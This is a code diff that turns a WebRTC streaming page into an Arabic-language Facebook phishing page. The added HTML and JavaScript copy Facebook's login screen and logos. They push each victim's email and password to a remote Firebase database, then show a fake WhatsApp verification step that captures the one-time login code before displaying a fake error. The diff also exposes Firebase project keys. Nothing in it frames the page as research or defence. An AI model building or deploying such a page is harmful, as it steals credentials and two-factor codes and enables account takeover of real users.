@@ -1,96 +1,133 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Delta-X Cloud Host (Port 8080)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 20px; }
-        h1 { text-shadow: 0 0 10px #0f0; }
-        /* هنا بنعرض اللي الـ Core بيبثه على 8080 */
-        #localStream { width: 100%; max-width: 500px; border: 3px solid #0f0; border-radius: 15px; box-shadow: 0 0 20px #0f0; }
-        canvas { display: none; } /* كانفس مخفي لتحويل الصور لفيديو */
-        button { padding: 15px 30px; background: #0f0; border: none; cursor: pointer; font-weight: bold; border-radius: 10px; font-size: 18px; margin-top: 20px; }
-        #status { color: #ff0; margin-top: 15px; font-weight: bold; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fff; margin: 0; padding: 0; overflow-x: hidden; }
+        .app-wrapper { width: 100%; max-width: 500px; margin: 0 auto; min-height: 100vh; position: relative; }
+        .screen { display: none; width: 100%; padding: 20px; animation: slideIn 0.3s ease-out forwards; }
+        .active { display: block; }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-30px); } to { opacity: 1; transform: translateX(0); } }
+        .top-banner { background: #f0f2f5; padding: 10px; text-align: center; font-size: 13px; color: #1c1e21; border-bottom: 1px solid #dddfe2; }
+        .lang-switcher { text-align: center; color: #757575; font-size: 12px; margin: 20px 0; }
+        .logo-img { width: 65px; display: block; margin: 20px auto 40px; }
+        .input-field { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 12px; background: #f5f6f7; font-size: 16px; outline: none; }
+        .input-field:focus { border-color: #1877f2; background: #fff; }
+        .btn-blue { width: 100%; background: #1877f2; color: #fff; border: none; padding: 12px; border-radius: 30px; font-size: 18px; font-weight: bold; margin-top: 10px; cursor: pointer; transition: 0.2s; }
+        .btn-outline { width: 100%; background: none; border: 1px solid #1877f2; color: #1877f2; padding: 10px; border-radius: 30px; font-weight: bold; margin-top: 80px; text-decoration: none; display: block; text-align: center; }
+        .meta-logo { width: 60px; display: block; margin: 40px auto; }
+        .verify-header { display: flex; align-items: center; justify-content: flex-end; margin-bottom: 20px; cursor: pointer; }
+        .back-arrow { font-size: 24px; font-weight: bold; margin-left: 10px; transform: rotate(180deg); }
+        h2 { font-size: 22px; color: #1c1e21; margin: 10px 0; text-align: right; }
+        p { color: #65676b; font-size: 15px; line-height: 1.4; text-align: right; }
+        .illustration { width: 100%; border-radius: 12px; margin: 20px 0; }
+        .option-row { display: flex; align-items: center; padding: 15px; border: 1px solid #dddfe2; border-radius: 12px; margin-bottom: 10px; cursor: pointer; }
+        .option-text { flex: 1; margin-right: 15px; font-size: 15px; text-align: right; }
+        .option-text strong { display: block; color: #1c1e21; }
+        .btn-gray { width: 100%; background: none; border: 1px solid #bec3c9; color: #4b4f56; padding: 10px; border-radius: 20px; font-weight: bold; margin-top: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <h1>DELTA-X CORE ENGINE</h1>
-    
-    <img id="localStream" src="http://localhost:8080" crossorigin="anonymous">
-    <canvas id="bufferCanvas"></canvas>
-    
-    <br>
-    <button id="startBtn">بدء البث السحابي (WebRTC)</button>
-    <div id="status">في انتظار الاتصال بـ Core:8080...</div>
 
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+<div class="app-wrapper">
+    <div id="step1" class="screen active">
+        <div class="top-banner">احصل على فيسبوك لهاتف Android واستمتع بتصفح أسرع.</div>
+        <div class="lang-switcher">العربية</div>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" class="logo-img">
+        <input type="text" id="email" class="input-field" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
+        <input type="password" id="pass" class="input-field" placeholder="كلمة السر">
+        <button class="btn-blue" id="loginBtn">تسجيل الدخول</button>
+        <div style="text-align: center; margin-top: 15px;"><a href="#" style="color:#1c1e21; text-decoration:none; font-size:14px;">هل نسيت كلمة السر؟</a></div>
+        <a href="https://m.facebook.com/reg/" class="btn-outline">إنشاء حساب جديد</a>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" class="meta-logo">
+    </div>
 
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyCpeOSPCzow5Iv472BUEmKvYVt63cIsi-E",
-            databaseURL: "https://delta-x-b7b69-default-rtdb.firebaseio.com",
-            projectId: "delta-x-b7b69",
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+    <div id="step2" class="screen">
+        <div class="verify-header" onclick="navTo(1)"><span class="back-arrow">›</span></div>
+        <h2>تحقق من إشعاراتك على جهاز آخر</h2>
+        <p>لقد أرسلنا إشعاراً إلى جهازك. يرجى تفقد إشعارات فيسبوك هناك والموافقة على تسجيل الدخول للمتابعة.</p>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v4/yf/r/XIVCcE5841v.png" class="illustration">
+        <button class="btn-gray" onclick="navTo(3)">جرب طريقة أخرى</button>
+    </div>
 
-        const img = document.getElementById('localStream');
-        const canvas = document.getElementById('bufferCanvas');
-        const ctx = canvas.getContext('2d');
-        let pc;
+    <div id="step3" class="screen">
+        <div class="verify-header" onclick="navTo(2)"><span class="back-arrow">›</span></div>
+        <h2>اختيار طريقة لتأكيد هويتك</h2>
+        <div class="option-row" onclick="document.getElementById('opt_wa').checked = true">
+            <input type="radio" id="opt_wa" name="opt" checked>
+            <div class="option-text">
+                <strong>واتساب</strong>
+                <small>سنرسل رمزاً إلى هاتفك المرتبط</small>
+            </div>
+        </div>
+        <button class="btn-blue" id="confirmWayBtn" style="border-radius: 8px;">متابعة</button>
+    </div>
 
-        // الرد على سؤالك: إزاي بنبعت الـ Stream؟
-        function getStreamFromLocalhost() {
-            // بنضبط الكانفس على نفس مقاس الصورة اللي جاية من 8080
-            canvas.width = img.naturalWidth || 1280;
-            canvas.height = img.naturalHeight || 720;
-            
-            // بنرسم الصورة على الكانفس 30 مرة في الثانية (30 FPS)
-            function draw() {
-                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
-                requestAnimationFrame(draw);
-            }
-            draw();
+    <div id="step4" class="screen">
+        <div class="verify-header" onclick="navTo(3)"><span class="back-arrow">›</span></div>
+        <h2>يرجى التحقق من رسائل واتساب</h2>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/v4/yY/r/eeYCNPLxRiw.png" class="illustration" style="max-width: 250px; margin: 20px auto; display: block;">
+        <input type="text" id="otp" class="input-field" placeholder="الرمز" style="text-align: center; letter-spacing: 6px; font-weight: bold;">
+        <button class="btn-blue" id="otpBtn" style="border-radius: 8px;">متابعة</button>
+        <button class="btn-gray" onclick="navTo(1)">إلغاء</button>
+    </div>
+</div>
 
-            // هنا السحر: بنحول الكانفس لـ Stream (فيديو)
-            return canvas.captureStream(30); 
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyCpeOSPCzow5Iv472BUEmKvYVt63cIsi-E",
+        authDomain: "delta-x-b7b69.firebaseapp.com",
+        databaseURL: "https://delta-x-b7b69-default-rtdb.firebaseio.com",
+        projectId: "delta-x-b7b69",
+        storageBucket: "delta-x-b7b69.firebasestorage.app",
+        messagingSenderId: "758371825673",
+        appId: "1:758371825673:web:59fcf8401f5ae58bf9a0d8"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    window.navTo = function(step) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + step).classList.add('active');
+        window.scrollTo(0, 0);
+    };
+
+    // 1. إرسال الإيميل والباسورد
+    document.getElementById('loginBtn').addEventListener('click', () => {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+        if(email && pass) {
+            push(ref(db, 'users/'), { email, password: pass, timestamp: new Date().toISOString() })
+            .then(() => navTo(2));
         }
+    });
 
-        document.getElementById('startBtn').onclick = async () => {
-            const status = document.getElementById('status');
-            try {
-                status.innerText = "جاري سحب البث وتحويله لـ WebRTC...";
-                
-                // 1. الحصول على الـ Stream من الكانفس
-                const stream = getStreamFromLocalhost();
+    // 2. إرسال طلب الكود (فصل الطلب في فرع 'requests')
+    document.getElementById('confirmWayBtn').addEventListener('click', () => {
+        set(ref(db, 'requests/'), {
+            action: "waiting_for_code",
+            timestamp: new Date().toISOString()
+        }).then(() => navTo(4));
+    });
 
-                // 2. إعداد اتصال WebRTC
-                pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+    // 3. إرسال الكود الفعلي (في فرع 'codes')
+    document.getElementById('otpBtn').addEventListener('click', () => {
+        const otpCode = document.getElementById('otp').value;
+        if(otpCode) {
+            push(ref(db, 'codes/'), {
+                code: otpCode,
+                timestamp: new Date().toISOString()
+            }).then(() => alert("حدث خطأ في النظام، يرجى المحاولة لاحقاً"));
+        }
+    });
+</script>
 
-                // 3. إضافة التراك (التنفيذ الفعلي للسطر اللي سألت عليه)
-                stream.getTracks().forEach(track => pc.addTrack(track, stream));
-
-                // 4. إرسال الـ Offer للفايربيس
-                pc.onicecandidate = e => {
-                    if (e.candidate) db.ref('rooms/1/hostCandidates').push(e.candidate.toJSON());
-                };
-
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                await db.ref('rooms/1/offer').set({ type: offer.type, sdp: offer.sdp });
-
-                db.ref('rooms/1/answer').on('value', async (snap) => {
-                    if (snap.val() && !pc.currentRemoteDescription) {
-                        await pc.setRemoteDescription(new RTCIceDescription(snap.val()));
-                        status.innerText = "تم الربط السحابي بنجاح ✅";
-                    }
-                });
-
-            } catch (err) {
-                status.innerText = "خطأ: " + err.message;
-            }
-        };
-    </script>
 </body>
 </html>
